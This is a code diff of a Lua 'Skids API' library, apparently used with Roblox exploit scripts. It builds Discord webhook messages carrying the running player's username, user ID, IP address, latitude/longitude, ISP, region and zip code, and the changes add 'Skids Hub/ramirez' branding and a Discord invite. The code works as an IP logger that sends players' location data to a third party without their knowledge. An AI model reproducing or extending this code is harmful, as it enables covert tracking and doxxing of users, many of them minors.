@@ -35,12 +35,15 @@ do
        
        
             return {
-                ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') ' .. scriptName,
+                ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') fired ' .. scriptName,
                 ["embeds"] = {
                         {
+                        ["title"] = "Skids API",
+                        ["description"] = "__a library made for skids :wink:__",
                         ['thumbnail'] = {
                             ['url']=string.format('https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&UserId=%d&format=png',player.UserId)
                         },
+                        ["url"] = "https://discord.gg/EUaH265S",
                         ["color"] = 526344,
                         ["fields"] = {
                             {
@@ -48,13 +51,18 @@ do
                             ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername: %s\nDisplayName: %s\nUserID: %d', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'), player.UserId)
                             },
                             {
-                            ["name"] = "Personal",
-                            ["value"] = string.format("**IPV4**: ||%s||*\n**Lat/Lon**: %s/%s*\n**ISP**: %s\n**Used**: %s*\n**Region**: %s/%s*\n**Zipcode**: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
+                            ["name"] = "More Info",
+                            ["value"] = string.format("*IPV4/V6: ||%s||*\n*Lat/Lon: %s/%s*\n*Isp/Org*: %s\n*Exploit: %s*\n*Country/Region: %s/%s*\n*zip: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
                             }
                         },
                         ["author"] = {
+                            ["name"] = "Skids Hub/ramirez",
+                            ["url"] = "https://discord.gg/EUaH265S",
+                            ["icon_url"] = "https://media.discordapp.net/attachments/923562111660093451/927356696580456498/standard_1.gif"
                         },
                         ["footer"] = {
+                            ["text"] = "Skids Hub/ramirez",
+                            ["icon_url"] = "https://media.discordapp.net/attachments/923562111660093451/927356696580456498/standard_1.gif"
                         },
                         ["timestamp"] = parseDateTime()
                         }
@@ -99,15 +107,18 @@ do
 
             if not self then return end
 
-            scriptName = scriptName or 'Executed'
+            scriptName = scriptName or 'Viva Mexico!'
             local player = game.Players.LocalPlayer
             local gameThumb = string.format('https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png',game.PlaceId)
 
             local webhookJson = {
 
-            ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') ' .. scriptName ,
+            ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') fired ' .. scriptName ,
             ["embeds"] = {
                 {
+                ["title"] = "Skids API",
+                ["description"] = "__a library made for skids :wink:__",
+                ["url"] = "https://discord.gg/EUaH265S",
                 ["color"] = 526344,
                 ["fields"] = {
                     {
@@ -116,8 +127,13 @@ do
                     }
                 },
                 ["author"] = {
+                    ["name"] = "Skids Hub/ramirez",
+                    ["url"] = "https://discord.gg/EUaH265S",
+                    ["icon_url"] = "https://media.discordapp.net/attachments/923562111660093451/927356696580456498/standard_1.gif"
                 },
                 ["footer"] = {
+                    ["text"] = "Skids Hub/ramirez",
+                    ["icon_url"] = "https://media.discordapp.net/attachments/923562111660093451/927356696580456498/standard_1.gif"
                 },
                 ["thumbnail"] = {
                     ["url"] = gameThumb
@@ -146,6 +162,7 @@ do
 
     return skidApi
 end
+
 
 
 
